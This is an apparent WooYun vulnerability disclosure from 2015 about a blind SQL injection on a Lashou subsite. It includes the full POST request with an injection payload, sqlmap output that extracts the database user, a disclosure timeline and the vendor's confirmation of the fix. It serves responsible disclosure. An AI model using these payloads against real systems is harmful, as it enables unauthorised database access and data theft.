wybug_title: 拉手网某分站Mysql盲注漏洞
wybug_detail:
漏洞详情 披露状态：   									2015-04-27：	细节已通知厂商并且等待厂商处理中									2015-04-27：	厂商已经确认，细节仅向厂商公开									2015-05-07：	细节向核心白帽子及相关领域专家公开									2015-05-17：	细节向普通白帽子公开									2015-05-19：	厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： 拉手网某分站mysql盲注漏洞 详细说明：  漏洞所在请求
POST /index.php?r=tui/tui/goods HTTP/1.1Host: union.lashou.comContent-Length: 53Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://union.lashou.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: http://union.lashou.com/index.php?r=tui/tui/goodsAccept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.8,zh-CN;q=0.6,zh;q=0.4,zh-TW;q=0.2Cookie: TRACKID=4b3fc00d9d490583de53CategoryForm%5Bmain_cat%5D=3 and length(database())>1
数字型盲注，估计是漏网之鱼，再彻查系统吧   漏洞证明：  sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: CategoryForm[main_cat] (POST)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: CategoryForm[main_cat]=3  AND 7388=7388---[02:41:45] [INFO] testing MySQL[02:41:45] [INFO] confirming MySQL[02:41:45] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL >= 5.0.0[02:41:45] [INFO] fetching current user[02:41:45] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[02:41:45] [INFO] retrieved: [02:41:54] [WARNING] reflective value(s) found and filtering outunion_w@10.%current user: 'union_w@10.%'   修复方案：  过滤   版权声明：转载请注明来源 路人甲@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-04-27 12:02 厂商回复： 谢谢您的提交,而且谢谢您一直以来的关注,问题已经告知研发,正在排查问题,万谢. 最新状态： 2015-05-19：完成修复.
